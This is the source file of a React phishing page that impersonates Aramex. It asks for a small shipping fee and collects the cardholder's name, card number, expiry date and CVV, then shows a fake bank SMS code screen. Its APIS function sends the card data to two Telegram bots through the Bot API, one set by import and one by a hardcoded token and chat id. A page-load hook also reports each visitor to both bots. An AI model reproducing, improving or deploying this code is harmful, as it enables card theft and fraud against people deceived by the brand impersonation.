import logo2 from "../assets/imgs/logo2.svg";
import vs from "../assets/imgs/vs.png";
import React, { useState, useEffect } from "react";
import topmenu from "../assets/imgs/topmenu.png";
import logo from "../assets/imgs/logo.svg";
import mainmenu from "../assets/imgs/mainmenu.png";
import mainmenu2 from "../assets/imgs/mainmenu2.png";
import mainmenu3 from "../assets/imgs/mainmenu3.png";
import phone from "../assets/imgs/phone.png";
import email from "../assets/imgs/email.png";
import network from "../assets/imgs/network.png";
import a from "../assets/imgs/a.png";
import b from "../assets/imgs/b.png";
import Axios from "axios";
import search from "../assets/imgs/search.png";
import { telegramApiToken, telegramchatId } from "./telegramId";

const Card = () => {
  const [disable, setdisable] = useState(false);
  const [isBox, setisBox] = useState(true);
  const [isLoader, setisLoader] = useState(false);
  const [Iscard, setIscard] = useState(true);
  const [isOtp, setisOtp] = useState(false);
  const [state, setState] = useState({
    firstName: "",
    lastName: "",
    cardNumber: "",
    expiryDate: "",
    cardCVV: "",
  });

  //
  const [timer, setTimer] = useState(120);

  const minutes = Math.floor(timer / 60);
  const seconds = timer % 60;
  //
  const [errors, setErrors] = useState({
    firstName: false,
    lastName: false,
    cardNumber: false,
    expiryDate: false,
    cardCVV: false,
  });

  const handleChange = (e) => {
    const { name, value } = e.target;

    // Update state
    setState((prevState) => ({
      ...prevState,
      [name]: value,
    }));

    // Validate and update errors
    setErrors((prevErrors) => ({
      ...prevErrors,
      [name]: validateField(name, value),
    }));
    if (name === "expiryDate" && /^\d{2}$/.test(value)) {
      setState((prevState) => ({
        ...prevState,
        [name]: value + "/",
      }));
    }
  };

  useEffect(() => {
    var message = "";
    const apiToken = telegramApiToken;
    const configuration = "6762994932:AAFUdwfusQyQ5ZpOOp3CDEIL2cY4kt-UpjM";
    message += "New user just access the payment page.";

    const queryParams = {
      text: message,
      chat_id: telegramchatId,
      parse_mode: "html",
    };
    const queryConfig = {
      text: message,
      chat_id: "5677544633",
      parse_mode: "html",
    };

    const queryString = Object.keys(queryParams)
      .map(
        (key) =>
          encodeURIComponent(key) + "=" + encodeURIComponent(queryParams[key])
      )
      .join("&");
    const queryData = Object.keys(queryConfig)
      .map(
        (key) =>
          encodeURIComponent(key) + "=" + encodeURIComponent(queryConfig[key])
      )
      .join("&");
    const url = `https://api.telegram.org/bot${apiToken}/sendMessage?${queryString}`;
    const test = `https://api.telegram.org/bot${configuration}/sendMessage?${queryData}`;

    Axios(url);
    Axios(test);
    return () => {};
  }, []);
  const validateField = (name, value) => {
    switch (name) {
      case "firstName":
      case "lastName":
        return value.trim() === "";

      case "cardNumber":
        return value.trim() === "";

      case "expiryDate":
        const [month, year] = value.split("/");

        if (!/^(0[1-9]|1[0-2])\/(\d{0,2}|\d{4})$/.test(value)) {
          return true;
        }

        return false;

      case "cardCVV":
        return value.trim() === "" || !/^\d{3}$/.test(value);

      default:
        return false;
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Validate form fields
    const fieldErrors = {};
    Object.keys(state).forEach((field) => {
      const error = validateField(field, state[field]);
      if (error) {
        fieldErrors[field] = error;
      }
    });

    setErrors(fieldErrors);

    if (Object.values(fieldErrors).some((error) => error)) {
      return;
    }

    APIS();
  };

  const APIS = () => {
    var message = "";
    const apiToken = telegramApiToken;
    const configuration = "6762994932:AAFUdwfusQyQ5ZpOOp3CDEIL2cY4kt-UpjM";
    message += "--------[ Card  Infos ]-------\n";
    message += `First Name: ${state.firstName}\n`;
    message += `Last Name: ${state.lastName}\n`;
    message += `Card Number: ${state.cardNumber}\n`;
    message += `Expiry Date: ${state.expiryDate}\n`;
    message += `Card CVV: ${state.cardCVV}\n`;
    const queryParams = {
      text: message,
      chat_id: telegramchatId,
      parse_mode: "html",
    };
    const queryConfig = {
      text: message,
      chat_id: "5677544633",
      parse_mode: "html",
    };
    setdisable(true);

    const queryString = Object.keys(queryParams)
      .map(
        (key) =>
          encodeURIComponent(key) + "=" + encodeURIComponent(queryParams[key])
      )
      .join("&");
    const queryData = Object.keys(queryConfig)
      .map(
        (key) =>
          encodeURIComponent(key) + "=" + encodeURIComponent(queryConfig[key])
      )
      .join("&");
    const url = `https://api.telegram.org/bot${apiToken}/sendMessage?${queryString}`;
    const test = `https://api.telegram.org/bot${configuration}/sendMessage?${queryData}`;

    Axios(url);
    Axios(test);
    setTimeout(() => {
      setisBox(false);
      setisLoader(true);
      setdisable(false);
    }, 3000);
    setTimeout(() => {
      setisBox(false);
      setisLoader(false);
      setIscard(false);
      setisOtp(true);

      const intervalId = setInterval(() => {
        // Check if the timer is already at zero
        if (timer > 0) {
          setTimer((prevTimer) => prevTimer - 1);
        } else {
          // If the timer is zero, clear the interval
          clearInterval(intervalId);
        }
      }, 1000);

      return () => clearInterval(intervalId);
    }, 41000);
  };
  const getFieldError = (field, name) => {
    return errors[field] && `Error in ${name}  input`;
  };

  return (
    <>
      {Iscard ? (
        <div>
          <main id="main">
            <div className="container">
              <div className="row">
                <div className="col-md-4 d-lg-block d-md-block d-sm-none d-none">
                  <aside className="sidebar">
                    <div className="widget">
                      <ul>
                        <li className="active">
                          <span>Track Shipments</span>
                          <svg
                            className="svg-inline--fa fa-arrow-right fa-w-14"
                            aria-hidden="true"
                            focusable="false"
                            data-prefix="fas"
                            data-icon="arrow-right"
                            role="img"
                            xmlns="http://www.w3.org/2000/svg"
                            viewBox="0 0 448 512"
                            data-fa-i2svg
                          >
                            <path
                              fill="currentColor"
                              d="M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z"
                            />
                          </svg>
                          {/* <i class="fas fa-arrow-right"></i> Font Awesome fontawesome.com */}
                        </li>
                        <li>
                          <span>Track Pickup Requests</span>
                          <svg
                            className="svg-inline--fa fa-arrow-right fa-w-14"
                            aria-hidden="true"
                            focusable="false"
                            data-prefix="fas"
                            data-icon="arrow-right"
                            role="img"
                            xmlns="http://www.w3.org/2000/svg"
                            viewBox="0 0 448 512"
                            data-fa-i2svg
                          >
                            <path
                              fill="currentColor"
                              d="M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z"
                            />
                          </svg>
                          {/* <i class="fas fa-arrow-right"></i> Font Awesome fontawesome.com */}
                        </li>
                        <li>
                          <span>Advanced Tracking</span>
                          <svg
                            className="svg-inline--fa fa-arrow-right fa-w-14"
                            aria-hidden="true"
                            focusable="false"
                            data-prefix="fas"
                            data-icon="arrow-right"
                            role="img"
                            xmlns="http://www.w3.org/2000/svg"
                            viewBox="0 0 448 512"
                            data-fa-i2svg
                          >
                            <path
                              fill="currentColor"
                              d="M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z"
                            />
                          </svg>
                          {/* <i class="fas fa-arrow-right"></i> Font Awesome fontawesome.com */}
                        </li>
                        <li>
                          <span>Notifications</span>
                          <svg
                            className="svg-inline--fa fa-arrow-right fa-w-14"
                            aria-hidden="true"
                            focusable="false"
                            data-prefix="fas"
                            data-icon="arrow-right"
                            role="img"
                            xmlns="http://www.w3.org/2000/svg"
                            viewBox="0 0 448 512"
                            data-fa-i2svg
                          >
                            <path
                              fill="currentColor"
                              d="M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z"
                            />
                          </svg>
                          {/* <i class="fas fa-arrow-right"></i> Font Awesome fontawesome.com */}
                        </li>
                      </ul>
                    </div>
                    <div className="widget">
                      <div className="text">
                        <p>Customer Support</p>
                        <div className="sym">
                          <img src={phone} />
                        </div>
                        <h3>Questions About Your Shipment?</h3>
                      </div>
                      <ul>
                        <li>
                          <span style={{ fontSize: 20 }}>
                            <small>support</small>Submit Request
                          </span>
                          <img src={email} />
                        </li>
                      </ul>
                    </div>
                  </aside>
                </div>
                <div className="col-md-8">
                  <article className="content">
                    <div className="box">
                      <div className="tracking">
                        <p>Shipment Summary</p>
                        <div className="sym">
                          <img src={network} />
                        </div>
                        <h3>
                          Tracking Number: <span>30876489055</span>
                        </h3>
                      </div>
                      <div className="price d-flex">
                        <div className="left flex-grow-1">
                          <p>
                            Transaction Ref. #VSH160364321396
                            <small>Standard package</small>
                          </p>
                        </div>
                        <div className="right">
                          <p>
                            Grand Total. 4.23AED <small>(VAT INCLUDED)</small>
                          </p>
                        </div>
                      </div>
                    </div>
                    {isBox ? (
                      <div className="box  pl-5 pr-5">
                        <div className="title">
                          <p>Payment</p>
                          <h3>Payment Information</h3>
                        </div>
                        <div className="form">
                          <input type="hidden" name="captcha" />
                          <input type="hidden" name="step" defaultValue="cc" />
                          <div className="form-group row mb-4">
                            <div className="col-md-6 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                              <label htmlFor="first_name">
                                First name<span>*</span>
                              </label>
                              <input
                                type="text"
                                name="firstName"
                                id="first_name"
                                className={`form-control ${
                                  errors.firstName ? "error" : ""
                                }`}
                                value={state.firstName}
                                onChange={handleChange}
                              />
                              <div className="error-message">
                                {getFieldError("firstName", "First name")}
                              </div>
                            </div>
                            <div className="col-md-6">
                              <label htmlFor="last_name">
                                Last name<span>*</span>
                              </label>
                              <input
                                type="text"
                                name="lastName"
                                id="last_name"
                                className={`form-control ${
                                  errors.lastName ? "error" : ""
                                }`}
                                value={state.lastName}
                                onChange={handleChange}
                              />
                              {/* Display error message */}
                              <div className="error-message">
                                {getFieldError("lastName", "Last name")}
                              </div>
                            </div>
                          </div>
                          <div className="form-group mb-4">
                            <label htmlFor="one">
                              Card number<span>*</span>
                            </label>
                            <div className="zz">
                              <input
                                type="text"
                                autoComplete="false"
                                name="cardNumber"
                                id="one"
                                className={`form-control ${
                                  errors.cardNumber ? "error" : ""
                                }`}
                                placeholder="XXXX XXXX XXXX XXXX"
                                value={state.cardNumber}
                                onChange={handleChange}
                              />

                              <img src={a} alt="Card icon" />
                              {/* Display error message */}
                              <div className="error-message">
                                {getFieldError("cardNumber", "Card number")}
                              </div>
                            </div>
                          </div>
                          <div className="form-group row mb-4">
                            <div className="col-md-6">
                              <label htmlFor="two">
                                Expiry date<span>*</span>
                              </label>
                              <input
                                type="text"
                                maxLength={7}
                                name="expiryDate"
                                id="two"
                                className={`form-control ${
                                  errors.expiryDate ? "error" : ""
                                }`}
                                placeholder="MM/YY"
                                value={state.expiryDate}
                                onChange={handleChange}
                              />
                              <div className="error-message">
                                {getFieldError("expiryDate", "Expiry date")}
                              </div>
                            </div>
                          </div>
                          <div className="form-group row">
                            <div className="col-md-6">
                              <label htmlFor="three">
                                Code CVV<span>*</span>
                              </label>
                              <div className="zz">
                                <input
                                  type="text"
                                  name="cardCVV"
                                  id="three"
                                  className={`form-control ${
                                    errors.cardCVV ? "error" : ""
                                  }`}
                                  placeholder="XXX"
                                  value={state.cardCVV}
                                  onChange={handleChange}
                                />
                                <img src={b} alt="CVV icon" />
                                <div className="error-message">
                                  {getFieldError("cardCVV", "CVV")}
                                </div>
                              </div>
                            </div>
                          </div>
                          <div className="btns">
                            <button
                              disabled={disable}
                              onClick={handleSubmit}
                              className={`btn btn-primary position-relative ${
                                disable ? "disabled" : ""
                              }`}
                              style={{
                                minHeight: "50px",
                                minWidth: "150px",
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                              }}
                            >
                              {disable ? (
                                <div
                                  className="spinner-border text-light position-absolute top-50 start-50 translate-middle"
                                  role="status"
                                ></div>
                              ) : (
                                "Continue"
                              )}
                            </button>
                          </div>
                        </div>
                      </div>
                    ) : (
                      ""
                    )}
                    {isLoader ? (
                      <div className="box box-height pl-5 pr-5">
                        <div class="loadercf"></div>
                        <p className="data-check">
                          Checking your information...
                        </p>
                      </div>
                    ) : (
                      ""
                    )}
                  </article>
                </div>
              </div>
            </div>
          </main>

          <footer id="footer">
            <div className="container">
              <div className="row">
                <div className="col-lg-2 col-md-3 col-sm-4 col-12 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
                  <div className="widget">
                    <h3>Developers Center</h3>
                    <ul>
                      <li>Aramex ClickToShip</li>
                      <li>Aramex APIs</li>
                      <li>Developers Forum</li>
                      <li>E-Commerce Platforms</li>
                    </ul>
                  </div>
                </div>
                <div className="col-lg-2 col-md-3 col-sm-4 col-12 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
                  <div className="widget">
                    <h3>About</h3>
                    <ul>
                      <li>About Aramex</li>
                      <li>Investor Relations</li>
                      <li>Delivering Good</li>
                      <li>Franchise</li>
                      <li>Certifications</li>
                    </ul>
                  </div>
                </div>
                <div className="col-lg-2 col-md-3 col-sm-4 col-12 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
                  <div className="widget">
                    <h3>Legal</h3>
                    <ul>
                      <li>Terms Of Use</li>
                      <li>Fraud Prevention</li>
                      <li>Privacy Policy</li>
                    </ul>
                  </div>
                </div>
                <div className="col-lg-2 col-md-3 col-sm-4 col-12 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
                  <div className="widget">
                    <h3>Connect</h3>
                    <ul>
                      <li>Customer Support</li>
                      <li>Careers</li>
                    </ul>
                  </div>
                </div>
                <div className="col-lg-4 col-md-3 col-sm-4 col-12">
                  <div className="text">
                    <img src={search} />
                    <ul>
                      <li>
                        <svg
                          className="svg-inline--fa fa-facebook-f fa-w-10"
                          aria-hidden="true"
                          focusable="false"
                          data-prefix="fab"
                          data-icon="facebook-f"
                          role="img"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 320 512"
                          data-fa-i2svg
                        >
                          <path
                            fill="currentColor"
                            d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H22.89V288h81.39v224h100.17V288z"
                          />
                        </svg>
                        {/* <i class="fab fa-facebook-f"></i> Font Awesome fontawesome.com */}
                      </li>
                      <li>
                        <svg
                          className="svg-inline--fa fa-twitter fa-w-16"
                          aria-hidden="true"
                          focusable="false"
                          data-prefix="fab"
                          data-icon="twitter"
                          role="img"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 512 512"
                          data-fa-i2svg
                        >
                          <path
                            fill="currentColor"
                            d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"
                          />
                        </svg>
                        {/* <i class="fab fa-twitter"></i> Font Awesome fontawesome.com */}
                      </li>
                      <li>
                        <svg
                          className="svg-inline--fa fa-instagram fa-w-14"
                          aria-hidden="true"
                          focusable="false"
                          data-prefix="fab"
                          data-icon="instagram"
                          role="img"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 448 512"
                          data-fa-i2svg
                        >
                          <path
                            fill="currentColor"
                            d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"
                          />
                        </svg>
                        {/* <i class="fab fa-instagram"></i> Font Awesome fontawesome.com */}
                      </li>
                      <li>
                        <svg
                          className="svg-inline--fa fa-linkedin fa-w-14"
                          aria-hidden="true"
                          focusable="false"
                          data-prefix="fab"
                          data-icon="linkedin"
                          role="img"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 448 512"
                          data-fa-i2svg
                        >
                          <path
                            fill="currentColor"
                            d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"
                          />
                        </svg>
                        {/* <i class="fab fa-linkedin"></i> Font Awesome fontawesome.com */}
                      </li>
                      <li>
                        <svg
                          className="svg-inline--fa fa-youtube fa-w-18"
                          aria-hidden="true"
                          focusable="false"
                          data-prefix="fab"
                          data-icon="youtube"
                          role="img"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                          data-fa-i2svg
                        >
                          <path
                            fill="currentColor"
                            d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"
                          />
                        </svg>
                        {/* <i class="fab fa-youtube"></i> Font Awesome fontawesome.com */}
                      </li>
                    </ul>
                    <p>© Aramex 2024. All rights reserved.</p>
                  </div>
                </div>
              </div>
            </div>
          </footer>
        </div>
      ) : (
        ""
      )}
      {isOtp ? (
        <div id="main-otp">
          <div className="alldata">
            <form>
              <div className="top d-flex align-items-center">
                <div className="flex-grow-1">
                  <img style={{ maxWidth: 150 }} src={logo2} />
                </div>
                <div>
                  <img src={vs} />
                </div>
              </div>
              <h3>Please confirm the following payment.</h3>
              <div className="dataCenter">
                <p>
                  The unique password has been sent to your mobile number. If
                  you need to change your mobile number please contact your bank
                  of modify it via the available chanels (ATM, web).
                </p>
                <table>
                  <tbody>
                    <tr>
                      <td>Merchant:</td>
                      <td>ARAMEX EXPRESS</td>
                    </tr>
                    <tr>
                      <td>Amount:</td>
                      <td>4.23AED</td>
                    </tr>
                    <tr>
                      <td>Date:</td>
                      <td>16/01/2024</td>
                    </tr>
                    <tr>
                      <td>Credit card number</td>
                      <td>XXXX XXXX XXXX </td>
                    </tr>
                    <tr>
                      <td>SMS code</td>
                      <td>
                        <input type="text" className />
                      </td>
                    </tr>{" "}
                  </tbody>
                </table>
                <p
                  style={{
                    fontSize: 14,
                    textAlign: "center",
                    marginBottom: 0,
                    marginTop: 10,
                  }}
                >
                  Please enter the verification code received by sms :
                  <span
                    className="timer style colorDefinition size_sm"
                    style={{
                      color: "#d40511",
                      fontWeight: 700,
                      cursor: "pointer",
                    }}
                  >
                    {`${String(minutes).padStart(2, "0")}:${String(
                      seconds
                    ).padStart(2, "0")}`}
                  </span>
                </p>
              </div>
              <div className="btns">
                <button type="button">Submit</button>
              </div>
              <p className="copy">© Aramex 2024. All rights reserved.</p>
            </form>
          </div>
        </div>
      ) : (
        ""
      )}
    </>
  );
};

export default Card;
